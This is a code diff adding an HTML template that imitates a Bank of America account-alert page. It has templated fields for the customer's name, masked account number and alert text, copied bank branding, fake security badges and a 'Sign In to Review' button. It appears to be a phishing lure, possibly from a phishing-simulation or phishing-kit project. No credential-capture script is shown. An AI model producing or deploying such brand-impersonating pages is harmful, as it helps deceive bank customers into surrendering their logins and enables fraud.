@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>{param:alert_type} - Bank of America</title>
+    <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+    <div class="bofa-container">
+        <header class="bofa-header">
+            <div class="bofa-logo">
+                <svg viewBox="0 0 200 50" width="150" height="37">
+                    <rect fill="#E31837" width="30" height="30" rx="4"/>
+                    <text x="15" y="22" font-size="14" fill="#fff" text-anchor="middle" font-weight="bold">BofA</text>
+                    <text x="40" y="22" font-size="16" fill="#012169" font-weight="bold">Bank of America</text>
+                </svg>
+            </div>
+            <nav class="bofa-nav">
+                <a href="#">Personal</a>
+                <a href="#">Small Business</a>
+                <a href="#">Wealth Management</a>
+                <a href="#">Business</a>
+            </nav>
+        </header>
+
+        <main class="alert-main">
+            <div class="alert-card">
+                <div class="alert-header">
+                    <div class="alert-icon">
+                        <svg viewBox="0 0 24 24" width="48" height="48" fill="#E31837">
+                            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
+                        </svg>
+                    </div>
+                    <h1>{param:alert_type}</h1>
+                </div>
+
+                <div class="customer-section">
+                    <p class="customer-greeting">Dear {param:customer_name},</p>
+                    <p class="account-ref">Account ending in {param:account_mask}</p>
+                </div>
+
+                <div class="alert-message-box">
+                    <p>{param:alert_message}</p>
+                    <div class="alert-meta">
+                        <span>Alert ID: {random_id}</span>
+                        <span>Date: {timestamp}</span>
+                    </div>
+                </div>
+
+                <div class="security-tips">
+                    <h3>Security Reminder</h3>
+                    <ul>
+                        <li>Bank of America will never ask for your full password or PIN</li>
+                        <li>Always verify the website address before signing in</li>
+                        <li>Use the official Bank of America mobile app for secure access</li>
+                    </ul>
+                </div>
+
+                <div class="action-area">
+                    <button class="btn-bofa-primary" onclick="signInBOFA()">
+                        <svg viewBox="0 0 24 24" width="20" height="20" fill="currentColor">
+                            <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/>
+                        </svg>
+                        Sign In to Review
+                    </button>
+                    <button class="btn-bofa-secondary" onclick="contactSupport()">
+                        <svg viewBox="0 0 24 24" width="20" height="20" fill="currentColor">
+                            <path d="M20 15.5c-1.25 0-2.45-.2-3.57-.57-.35-.11-.74-.03-1.02.24l-2.2 2.2c-2.83-1.44-5.15-3.75-6.59-6.59l2.2-2.21c.28-.26.36-.65.25-1.01A11.36 11.36 0 0 1 8.5 4c0-.55-.45-1-1-1H4c-.55 0-1 .45-1 1 0 9.39 7.61 17 17 17 .55 0 1-.45 1-1v-3.5c0-.55-.45-1-1-1zM19 12h2a9 9 0 0 0-9-9v2c3.87 0 7 3.13 7 7z"/>
+                        </svg>
+                        Contact Support
+                    </button>
+                </div>
+
+                <div class="trust-indicators">
+                    <div class="trust-item">
+                        <svg viewBox="0 0 24 24" width="24" height="24" fill="#28a745">
+                            <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/>
+                        </svg>
+                        <span>256-bit SSL</span>
+                    </div>
+                    <div class="trust-item">
+                        <svg viewBox="0 0 24 24" width="24" height="24" fill="#28a745">
+                            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
+                        </svg>
+                        <span>Verified by Visa</span>
+                    </div>
+                    <div class="trust-item">
+                        <svg viewBox="0 0 24 24" width="24" height="24" fill="#28a745">
+                            <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/>
+                        </svg>
+                        <span>FDIC Insured</span>
+                    </div>
+                </div>
+            </div>
+        </main>
+
+        <footer class="bofa-footer">
+            <div class="footer-links">
+                <a href="#">Privacy</a>
+                <a href="#">Security</a>
+                <a href="#">Terms of Use</a>
+                <a href="#">Accessibility</a>
+            </div>
+            <p>© 2024 Bank of America Corporation. All rights reserved.</p>
+        </footer>
+    </div>
+
+    <script src="js/main.js"></script>
+</body>
+</html>
